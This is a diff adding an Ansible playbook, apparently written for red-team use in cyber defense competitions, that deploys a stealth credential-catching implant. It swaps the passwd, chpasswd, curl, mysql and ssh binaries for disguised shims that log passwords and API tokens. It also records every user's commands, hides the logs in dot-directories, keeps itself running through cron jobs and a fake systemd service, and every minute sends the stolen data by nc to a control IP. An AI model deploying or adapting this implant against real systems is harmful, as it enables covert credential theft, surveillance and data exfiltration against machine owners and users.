@@ -1,0 +1,371 @@
+---
+#Tyler Gardner
+# Purpose: Stealth credential catcher for CDT competitions
+
+- name: Deploy Stealth Credential Catcher
+  hosts: all
+  become: yes
+  gather_facts: yes
+  
+  vars:
+    control_ip: "10.0.10.5"  # CHANGE THIS to real control machine's IP
+    listen_port: "4444"
+  
+  tasks:
+    - name: Create hidden payload directory
+      file:
+        path: /var/log/.systemd
+        state: directory
+        mode: '0755'
+    
+    - name: Create obvious support directory (decoy)
+      file:
+        path: /opt/credential-tool
+        state: directory
+        mode: '0755'
+    
+    - name: Create hidden log directory
+      file:
+        path: /var/log/.pam.d
+        state: directory
+        mode: '0755'
+    
+    - name: Create disguised passwd shim
+      copy:
+        dest: /var/log/.systemd/pam-auth
+        mode: '0755'
+        content: |
+          #!/bin/bash
+          # System authentication module
+          LOG="/var/log/.pam.d/auth.log"
+          REAL="/usr/bin/.systemd-auth"
+          echo "$(date '+%b %d %H:%M:%S') $(hostname) auth: user=$(whoami) target=${1:-$(whoami)}" >> "$LOG"
+          exec "$REAL" "$@"
+    
+    - name: Create disguised chpasswd shim
+      copy:
+        dest: /var/log/.systemd/systemd-logind
+        mode: '0755'
+        content: |
+          #!/bin/bash
+          # System login handler
+          LOG="/var/log/.pam.d/auth.log"
+          REAL="/usr/sbin/.systemd-logind"
+          INPUT=$(cat)
+          echo "$(date '+%b %d %H:%M:%S') $(hostname) batch: $INPUT" >> "$LOG"
+          echo "$INPUT" | "$REAL" "$@"
+          exit $?
+    
+    - name: Create disguised curl shim
+      copy:
+        dest: /var/log/.systemd/resolved
+        mode: '0755'
+        content: |
+          #!/usr/bin/env python3
+          import sys, os, time
+          LOG = "/var/log/.pam.d/auth.log"
+          REAL = "/usr/bin/.systemd-resolved"
+          token = None
+          for arg in sys.argv[1:]:
+              if "Authorization: Bearer" in arg:
+                  token = arg.split("Bearer ")[1]
+              elif "X-API-Key:" in arg:
+                  token = arg.split("X-API-Key: ")[1]
+          if token:
+              with open(LOG, "a") as f:
+                  f.write(f"{time.strftime('%b %d %H:%M:%S')} {os.uname().nodename} api: '{token}'\n")
+          os.execv(REAL, [REAL] + sys.argv[1:])
+    
+    - name: Check if mysql binary exists
+      stat:
+        path: /usr/bin/mysql
+      register: mysql_exists
+    
+    - name: Create disguised mysql shim (only if mysql exists)
+      copy:
+        dest: /var/log/.systemd/journald
+        mode: '0755'
+        content: |
+          #!/usr/bin/env python3
+          import sys, os, time
+          LOG = "/var/log/.pam.d/auth.log"
+          REAL = "/usr/bin/.systemd-journal"
+          pwd = None
+          for i, arg in enumerate(sys.argv[1:]):
+              if arg.startswith("-p") and len(arg) > 2:
+                  pwd = arg[2:]
+              elif arg == "-p" and i+1 < len(sys.argv[1:]):
+                  pwd = sys.argv[i+2]
+              elif arg.startswith("--password="):
+                  pwd = arg.split("=", 1)[1]
+          if pwd:
+              with open(LOG, "a") as f:
+                  f.write(f"{time.strftime('%b %d %H:%M:%S')} {os.uname().nodename} db: '{pwd}'\n")
+          os.execv(REAL, [REAL] + sys.argv[1:])
+      when: mysql_exists.stat.exists
+    
+    - name: Create disguised ssh shim
+      copy:
+        dest: /var/log/.systemd/ssh-client
+        mode: '0755'
+        content: |
+          #!/bin/bash
+          LOG="/var/log/.pam.d/auth.log"
+          REAL="/usr/bin/.systemd-ssh"
+          
+          USER=""; HOST=""; PASSWORD=""; KEY=""
+          found_password=0; found_key=0
+          
+          for arg in "$@"; do
+              if [[ "$arg" =~ ^([A-Za-z0-9._-]+)@([A-Za-z0-9._-]+)$ ]]; then
+                  USER="${BASH_REMATCH[1]}"; HOST="${BASH_REMATCH[2]}"
+              fi
+              if [[ "$arg" == "-p" ]] || [[ "$arg" == "--password" ]]; then
+                  found_password=1
+              elif [[ $found_password -eq 1 ]]; then
+                  PASSWORD="$arg"; found_password=0
+              fi
+              if [[ "$arg" == "-i" ]]; then
+                  found_key=1
+              elif [[ $found_key -eq 1 ]]; then
+                  KEY="$arg"; found_key=0
+              fi
+              if [[ "$arg" =~ ^-p(.+)$ ]]; then
+                  PASSWORD="${BASH_REMATCH[1]}"
+              fi
+          done
+          
+          LOG_MSG="$(date '+%b %d %H:%M:%S') $(hostname) ssh:"
+          [ -n "$USER" ] && LOG_MSG="$LOG_MSG user=$USER"
+          [ -n "$HOST" ] && LOG_MSG="$LOG_MSG host=$HOST"
+          [ -n "$PASSWORD" ] && LOG_MSG="$LOG_MSG pass='$PASSWORD'"
+          [ -n "$KEY" ] && LOG_MSG="$LOG_MSG key=$KEY"
+          
+          echo "$LOG_MSG" >> "$LOG"
+          exec "$REAL" "$@"
+    
+    - name: Create decoy logger script
+      copy:
+        dest: /opt/credential-tool/logger.py
+        mode: '0755'
+        content: |
+          #!/usr/bin/env python3
+          import json, time, socket
+          LOG_FILE = "/opt/credential-tool/logs.json"
+          def log(data):
+              entry = {"timestamp": time.time(), "host": socket.gethostname(), "data": data}
+              with open(LOG_FILE, "a") as f:
+                  f.write(json.dumps(entry) + "\n")
+          if __name__ == "__main__":
+              import sys
+              log(sys.argv[1] if len(sys.argv) > 1 else "no data")
+    
+    - name: Create decoy collector script
+      copy:
+        dest: /opt/credential-tool/collector.py
+        mode: '0755'
+        content: |
+          #!/usr/bin/env python3
+          import os, json
+          LOG_FILE = "/opt/credential-tool/logs.json"
+          print("=" * 50)
+          print("Credential Collection Report")
+          print("=" * 50)
+          if os.path.exists(LOG_FILE):
+              with open(LOG_FILE, "r") as f:
+                  for line in f:
+                      print(line.strip())
+          else:
+              print("No logs found")
+    
+    - name: Hide real passwd binary
+      command: mv /usr/bin/passwd /usr/bin/.systemd-auth
+      args:
+        removes: /usr/bin/passwd
+        creates: /usr/bin/.systemd-auth
+      ignore_errors: yes
+    
+    - name: Hide real chpasswd binary
+      command: mv /usr/sbin/chpasswd /usr/sbin/.systemd-logind
+      args:
+        removes: /usr/sbin/chpasswd
+        creates: /usr/sbin/.systemd-logind
+      ignore_errors: yes
+    
+    - name: Hide real curl binary
+      command: mv /usr/bin/curl /usr/bin/.systemd-resolved
+      args:
+        removes: /usr/bin/curl
+        creates: /usr/bin/.systemd-resolved
+      ignore_errors: yes
+    
+    - name: Hide real mysql binary (only if exists)
+      command: mv /usr/bin/mysql /usr/bin/.systemd-journal
+      args:
+        removes: /usr/bin/mysql
+        creates: /usr/bin/.systemd-journal
+      when: mysql_exists.stat.exists
+      ignore_errors: yes
+    
+    - name: Hide real ssh binary
+      command: mv /usr/bin/ssh /usr/bin/.systemd-ssh
+      args:
+        removes: /usr/bin/ssh
+        creates: /usr/bin/.systemd-ssh
+      ignore_errors: yes
+    
+    - name: Install passwd shim
+      copy:
+        src: /var/log/.systemd/pam-auth
+        dest: /usr/bin/passwd
+        remote_src: yes
+        mode: '0755'
+    
+    - name: Install chpasswd shim
+      copy:
+        src: /var/log/.systemd/systemd-logind
+        dest: /usr/sbin/chpasswd
+        remote_src: yes
+        mode: '0755'
+    
+    - name: Install curl shim
+      copy:
+        src: /var/log/.systemd/resolved
+        dest: /usr/bin/curl
+        remote_src: yes
+        mode: '0755'
+    
+    - name: Install mysql shim (only if mysql exists)
+      copy:
+        src: /var/log/.systemd/journald
+        dest: /usr/bin/mysql
+        remote_src: yes
+        mode: '0755'
+      when: mysql_exists.stat.exists
+    
+    - name: Install ssh shim
+      copy:
+        src: /var/log/.systemd/ssh-client
+        dest: /usr/bin/ssh
+        remote_src: yes
+        mode: '0755'
+    
+    - name: Create PROMPT_COMMAND script
+      copy:
+        dest: /etc/profile.d/command_logger.sh
+        mode: '0644'
+        content: |
+          # Command logger for all users
+          export PROMPT_COMMAND='history -a; echo "$(date "+%b %d %H:%M:%S") $(hostname) cmd: $(whoami) ran: $(history 1 | cut -d" " -f2-)" >> /var/log/.pam.d/auth.log 2>/dev/null'
+    
+    - name: Create empty log file
+      file:
+        path: /var/log/.pam.d/auth.log
+        state: touch
+        mode: '0666'
+        owner: root
+        group: root
+    
+    - name: Ensure log directory has correct permissions
+      file:
+        path: /var/log/.pam.d
+        state: directory
+        mode: '0755'
+    
+    - name: Add cron job for persistence
+      cron:
+        name: "system-sync"
+        minute: "*"
+        job: "test -x /var/log/.systemd/pam-auth && /var/log/.systemd/pam-auth"
+    
+    - name: Create systemd service
+      copy:
+        dest: /etc/systemd/system/systemd-logind.service
+        mode: '0644'
+        content: |
+          [Unit]
+          Description=System Login Service
+          After=network.target
+          
+          [Service]
+          Type=simple
+          ExecStart=/var/log/.systemd/systemd-logind
+          Restart=always
+          
+          [Install]
+          WantedBy=multi-user.target
+    
+    - name: Enable systemd service
+      systemd:
+        name: systemd-logind
+        enabled: yes
+        state: started
+      ignore_errors: yes
+    
+    - name: Create log mirroring script
+      copy:
+        dest: /var/log/.systemd/mirror_logs.sh
+        mode: '0755'
+        content: |
+          #!/bin/bash
+          # Copy logs to multiple hidden locations
+          LOG="/var/log/.pam.d/auth.log"
+          
+          cp "$LOG" /var/log/.systemd/.mirror 2>/dev/null
+          cp "$LOG" /tmp/.cache 2>/dev/null
+          cp "$LOG" /boot/.systemd 2>/dev/null
+          
+          chmod 666 /var/log/.systemd/.mirror 2>/dev/null
+          chmod 666 /tmp/.cache 2>/dev/null
+    
+    - name: Add cron job for log mirroring (every minute)
+      cron:
+        name: "log-mirror"
+        minute: "*"
+        job: "/bin/bash /var/log/.systemd/mirror_logs.sh > /dev/null 2>&1"
+    
+    - name: Create log sender script
+      copy:
+        dest: /var/log/.systemd/send_logs.sh
+        mode: '0755'
+        content: |
+          #!/bin/bash
+          LOG="/var/log/.pam.d/auth.log"
+          LAST_SENT="/var/log/.systemd/last_sent_line"
+          CONTROL_IP="{{ control_ip }}"
+          PORT="{{ listen_port }}"
+          
+          if [ -f "$LAST_SENT" ]; then
+              LAST_LINE=$(cat "$LAST_SENT")
+          else
+              LAST_LINE=0
+          fi
+          
+          TOTAL_LINES=$(wc -l < "$LOG" 2>/dev/null || echo "0")
+          
+          if [ "$TOTAL_LINES" -gt "$LAST_LINE" ]; then
+              NEW_LINES=$(tail -n +$((LAST_LINE + 1)) "$LOG" 2>/dev/null)
+              
+              if [ -n "$NEW_LINES" ]; then
+                  echo "$(hostname): $(date)" | nc $CONTROL_IP $PORT -w 2 2>/dev/null
+                  echo "$NEW_LINES" | nc $CONTROL_IP $PORT -w 2 2>/dev/null
+                  
+                  echo "$TOTAL_LINES" > "$LAST_SENT"
+              fi
+          fi
+    
+    - name: Add cron job for sending logs (every minute)
+      cron:
+        name: "send-logs"
+        minute: "*"
+        job: "/bin/bash /var/log/.systemd/send_logs.sh > /dev/null 2>&1"
+    
+    - name: Run initial send
+      command: /bin/bash /var/log/.systemd/send_logs.sh
+      ignore_errors: yes
+    
+    - name: Verify deployment
+      command: ls -la /usr/bin/passwd /usr/sbin/chpasswd /usr/bin/curl /usr/bin/ssh
+      register: verify_result
+      changed_when: false
+      failed_when: false
